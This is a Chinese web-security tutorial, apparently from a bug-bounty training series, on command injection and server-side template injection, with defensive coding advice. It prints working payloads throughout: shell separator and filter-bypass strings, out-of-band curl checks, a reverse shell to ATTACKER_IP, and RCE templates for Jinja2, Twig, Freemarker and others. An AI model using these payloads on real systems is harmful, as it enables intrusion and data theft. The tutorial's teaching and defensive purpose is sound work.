---
title: 第 8 篇：命令执行与 SSTI
layout: article
---
{% raw %}
# 第 8 篇：命令执行与 SSTI——让现有代码替我们干活

前一篇是"把代码放进去"，这一篇是"让服务器上已有的代码替我们执行"：

- **命令执行（RCE）**：用户输入被拼进系统命令，攻击者用 `;`、`|`、`&&` 追加命令。
- **SSTI**：用户输入被拼进模板，攻击者用 `{{ }}`、`${ }` 让模板引擎执行表达式，最终走到 `os.popen`、`Runtime.exec`。

两者最终都能拿到服务器权限，区别只是入口在"shell"还是"模板"。

---

## 一、命令执行：拼接符是第一课

有漏洞的代码：

```php
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
```

正常请求：

```text
?ip=127.0.0.1
```

攻击者传：

```text
?ip=127.0.0.1;id
?ip=127.0.0.1|id
?ip=127.0.0.1||id
?ip=127.0.0.1&&id
?ip=127.0.0.1%0aid
```

### Linux 拼接符

| 符号 | 含义 |
| --- | --- |
| `;` | 顺序执行，不管前面成功失败 |
| 管道符（竖线） | 前一个命令的输出交给后一个 |
| 双竖线 | 前面失败才执行后面 |
| `&` | 放到后台，继续执行后面 |
| `&&` | 前面成功才执行后面 |
| `%0a` | 换行，等价于新命令 |
| 反引号 | 命令替换 |
| `$()` | 命令替换 |

对应的拼接示例：

```bash
127.0.0.1;id
127.0.0.1|id
127.0.0.1||id
127.0.0.1&id
127.0.0.1&&id
127.0.0.1%0aid
`id`
$(id)
```

### Windows 拼接符

```text
127.0.0.1 & whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
127.0.0.1 %0a whoami
```

### DVWA 实验

DVWA Command Injection（low）页面输入：

```text
127.0.0.1; cat /etc/passwd
```

如果返回里出现 `root:x:0:0`，说明命令执行成功。**只读 `/etc/passwd` 证明即可，不要读业务配置、不要加用户、不要反弹 shell。**

---

## 二、无回显命令执行

很多接口只返回"操作成功/失败"，看不到命令输出。这时用带外或时间差。

### 1. 时间盲打

```text
127.0.0.1; sleep 5
```

如果响应明显慢了 5 秒，说明命令执行了。Windows：

```text
127.0.0.1 & timeout /t 5
```

### 2. DNSLog

```text
127.0.0.1; curl http://your-id.dnslog.cn
127.0.0.1; nslookup your-id.dnslog.cn
127.0.0.1; ping -c 1 your-id.dnslog.cn
```

平台收到 DNS 查询就证明命令执行。**只证明，不要把命令输出编码进域名外带。**

### 3. 写文件再读

```text
127.0.0.1; id > /var/www/html/uploads/out.txt
```

然后访问 `/uploads/out.txt`。这会在目标上留文件，真实项目要谨慎，验证完尽量删除。

### 4. 反弹 shell（只了解，不要在真实目标用）

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

这条命令会建立反向连接，属于**明确越界**的行为。SRC 里绝对不要用，学习阶段只在本地隔离靶场试。

---

## 三、命令执行绕过

### 空格被过滤

```bash
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd
```

`${IFS}` 是 shell 的内部字段分隔符，默认包含空格/Tab/换行。

### 关键字被过滤

```bash
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
ca$@t /etc/passwd
```

### Base64 编码

```bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

如果 `base64` 被过滤，用 `base64 -d` 的替代写法或 `python3 -c` 解码。

### 长度限制

- 用 `>a` 逐字符写文件，再 `bash a`；
- 用 `wget` 下载远程脚本；
- 用 `curl` 的 `-o` 写文件。

这些是 CTF 技巧，SRC 里遇到长度限制的概率不高，了解即可。

### 防御

```php
// 错误：直接拼接
system("ping -c 1 " . $_GET['ip']);

// 好一点：参数化，不经过 shell
$ip = filter_var($_GET['ip'], FILTER_VALIDATE_IP);
if ($ip === false) die('IP 非法');
exec('ping -c 1 ' . escapeshellarg($ip));
```

要点：

- 能用 API 就不用 shell（比如用 `ping` 库、`socket` 库）；
- 必须用 shell 时，用 `escapeshellarg()` 包裹每个参数；
- 对 IP、域名、文件名做格式白名单；
- `disable_functions` 禁用 `system/exec/shell_exec/passthru/proc_open/popen`；
- 容器化、最小权限运行，别用 root。

**注意：** `escapeshellarg()` 不是万能的，某些场景（如 Windows、数组参数）仍有绕过。最稳的是"不拼接"。

---

## 四、SSTI：模板注入是什么

很多 Web 框架用模板渲染页面：

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get("name", "world")
    return render_template_string("Hello " + name)
```

正常访问 `/?name=Alice`，返回 `Hello Alice`。攻击者传：

```text
/?name={{7*7}}
```

如果返回 `Hello 49`，说明 `{{ }}` 被模板引擎执行了，这就是 SSTI（Server-Side Template Injection）。

**根因：** 用户输入被拼进模板源码，而不是作为变量传给模板。

正确写法：

```python
return render_template_string("Hello {{ name }}", name=name)
```

此时 `name` 是数据，`{{7*7}}` 只会原样输出。

---

## 五、先识别模板引擎

不同引擎的语法不同，先做指纹：

|  payload | Jinja2 | Twig | Freemarker | Velocity | Smarty |
| --- | --- | --- | --- | --- | --- |
| `{{7*7}}` | 49 | 49 | 不解析 | 不解析 | 不解析 |
| `{{7*'7'}}` | `7777777` | 49 | 不解析 | 不解析 | 不解析 |
| `${7*7}` | 不解析 | 不解析 | 49 | 不解析 | 不解析 |
| `#{7*7}` | 不解析 | 不解析 | 不解析 | 不解析 | 不解析 |
| `<%= 7*7 %>` | 不解析 | 不解析 | 不解析 | 不解析 | 不解析 |
| `{7*7}` | 不解析 | 不解析 | 不解析 | 不解析 | 49 |

更细的指纹：

```text
{{7*7}}        → 49      Jinja2 / Twig
{{7*'7'}}      → 7777777 Jinja2（字符串重复）
{{7*'7'}}      → 49      Twig（转数字）
${7*7}         → 49      Freemarker / JSP EL
<%= 7*7 %>     → 49      ERB / EJS
#{7*7}         → 49      Ruby / Thymeleaf 某些场景
```

**注意：** 只发数学表达式，不要一上来就发 `os.popen`。很多 WAF 会拦关键字，先用 `7*7` 确认。

---

## 六、Jinja2（Flask/Django 常见）

### 1. 读配置

```text
{{config}}
{{config.items()}}
```

能读到 `SECRET_KEY`、数据库连接等。**不要把这些值贴进报告，读到就停。**

### 2. 找类

```text
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

`__subclasses__()` 会返回很多类，找 `subprocess.Popen`、`os._wrap_close` 等。

### 3. 直接执行命令

Flask/Jinja 默认全局里有 `cycler`、`lipsum`、`url_for` 等：

```text
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen("id").read() }}
{{ url_for.__globals__['os'].popen('id').read() }}
```

如果 `os` 被过滤，用 `__import__`：

```text
{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### 4. 过滤绕过

如果 `__class__`、`__globals__` 被 WAF 拦：

```text
{{''|attr('__class__')|attr('__mro__')}}
{{''['__class__']['__mro__']}}
{{''.__class__.__base__.__subclasses__()}}
```

用 `|attr` 或中括号取属性，能绕过一部分关键字匹配。

### 5. 盲 SSTI

没有回显时，用时间差：

```text
{{ cycler.__init__.__globals__.os.popen('sleep 5').read() }}
```

响应慢 5 秒说明执行了。也可以用 DNSLog：

```text
{{ cycler.__init__.__globals__.os.popen('curl http://your-id.dnslog.cn').read() }}
```

### 6. Flask 本地实验

把上面的 `render_template_string` 代码保存成 `ssti_lab.py`，启动：

```bash
python3 ssti_lab.py
```

测试：

```bash
curl 'http://127.0.0.1:5000/?name={{7*7}}'
curl 'http://127.0.0.1:5000/?name={{7*%277%27}}'
curl 'http://127.0.0.1:5000/?name={{config}}'
```

确认 `49` 后，再试：

```bash
curl --get 'http://127.0.0.1:5000/' \
  --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('id').read() }}"
```

**只在本地跑，确认到 `id` 就停。**

---

## 七、Twig / Freemarker / Velocity / Smarty

### Twig（PHP）

检测：

```text
{{7*7}}      → 49
{{7*'7'}}    → 49（Jinja 是 7777777）
```

老版本 Twig 1.x：

```text
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Twig 2.x/3.x 可尝试：

```text
{{['id']|filter('system')}}
{{['id']|map('system')|join}}
{{['id']|sort('system')|join}}
```

不同版本/沙箱配置结果不同，先看 `{{7*7}}` 是否执行，再逐个试。

### Freemarker（Java）

```text
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

新版 Freemarker 可能禁用 `?new()`，报错里会提示 `TemplateClassResolver`。这时尝试其他类或放弃，不要死磕。

### Velocity（Java）

```text
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```

`exec` 没有回显，需要读 `Process` 的输入流。完整 payload 较长，思路是：

1. 反射拿 `Runtime`；
2. `exec` 执行命令；
3. 读 `getInputStream()` 输出。

### Smarty（PHP）

老版本：

```text
{php}system('id');{/php}
```

Smarty 3 某些配置：

```text
{system('id')}
```

### Thymeleaf（Spring）

```text
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

需要 Spring EL 表达式预处理，常见于 Thymeleaf 模板拼接。先用 `${7*7}` 确认表达式执行。

### ERB（Ruby）

```text
<%= system('id') %>
<%= `id` %>
```

---

## 八、防御：不拼接、不渲染用户输入

### 命令执行

```php
$ip = $_GET['ip'] ?? '';
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die('IP 非法');
}

// PHP 7.4+ 数组形式，不经过 shell
$proc = proc_open(
    ['ping', '-c', '1', $ip],
    [1 => ['pipe', 'w'], 2 => ['pipe', 'w']],
    $pipes
);
echo stream_get_contents($pipes[1]);
```

要点：

- **不拼接**：用数组参数调用 `proc_open`，每个参数独立传递；
- 必须拼接时，用 `escapeshellarg()`；
- 对 IP、域名、用户名做格式白名单；
- `disable_functions` 禁用危险函数；
- 用低权限用户运行 Web 服务；
- 容器内运行，限制出网。

### SSTI

```python
# 错误：用户输入进了模板源码
return render_template_string("Hello " + name)

# 正确：用户输入是变量
return render_template_string("Hello {{ name }}", name=name)
```

要点：

- 永远不要把用户输入拼进模板字符串；
- 用 `render_template()` 加载固定模板文件；
- 必须动态模板时，用沙箱：

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string("Hello {{ name }}")
return template.render(name=name)
```

- Twig 开启 `autoescape`，不要用 `createTemplate($userInput)`；
- 模板编辑功能只给可信管理员，且做审计；
- 对邮件/PDF/通知模板的变量做转义。

**注意：** 沙箱不是绝对安全，历史上 Jinja2/Twig 沙箱都有逃逸。最根本的还是"不把用户输入当模板"。

---

## 九、SRC 里怎么测

### 命令执行

1. 找调用系统命令的功能：Ping、Traceroute、DNS 查询、Whois、图片处理、视频转码、压缩、备份、导入、Git 克隆。
2. 先传正常值，确认功能可用。
3. 用 `;id`、`|id`、`||id`、`&&id`、`%0aid` 逐个试。
4. 无回显用 `;sleep 5` 测时间，或用 DNSLog。
5. **不要**反弹 shell、不要写计划任务、不要改配置、不要读 `/etc/shadow`。
6. 报告写清命令执行点和回显，附最小 payload（如 `;id`）。

### SSTI

1. 找会把输入渲染到页面的功能：昵称、标题、公告、邮件模板、PDF/发票、通知。
2. 先发 `{{7*7}}`、`${7*7}`、`<%= 7*7 %>`、`#{7*7}`，看哪个变成 `49`。
3. 确认后再发 `{{7*'7'}}` 区分 Jinja2/Twig。
4. **不要**在生产上直接发 `os.popen` 或 `Runtime.exec`；用数学表达式证明即可。
5. 如果必须证明 RCE，用 `id` 或 `whoami`，不要读文件、不要外带数据。
6. 报告写清模板引擎、注入点和表达式执行结果。

---

## 十、本篇自检清单

- [ ] 能说出 Linux/Windows 各 5 种命令拼接符。
- [ ] 在 DVWA Command Injection 里用 `;id` 拿到命令执行。
- [ ] 会用 `sleep` 和 DNSLog 测无回显命令执行。
- [ ] 能说出 `${IFS}`、`c'a't`、`/bin/c?t` 的绕过原理。
- [ ] 能写出不经过 shell 的 `proc_open` 数组调用。
- [ ] 能识别 `{{7*7}}` 和 `{{7*'7'}}` 分别对应哪个模板引擎。
- [ ] 在本地 Flask 靶场用 `cycler` 链执行 `id`。
- [ ] 知道 Jinja2/Twig/Freemarker 各一个 RCE payload。
- [ ] 能写出"用户输入作为变量"的正确渲染代码。
- [ ] 知道 SRC 里只证明表达式执行，不 dump 配置、不反弹 shell。

---


{% endraw %}

**下一篇：[《反序列化与组件漏洞》](第9篇-反序列化与组件漏洞.md)**：命令执行和 SSTI 是"应用层"的代码执行；反序列化是"数据变成对象"时的执行，Log4j、Fastjson、Shiro、ThinkPHP 这些组件漏洞则是"依赖里的地雷"。那篇讲 PHP/Java 反序列化基础、CommonCollections 链、JNDI 注入、Log4Shell 的复现与检测。
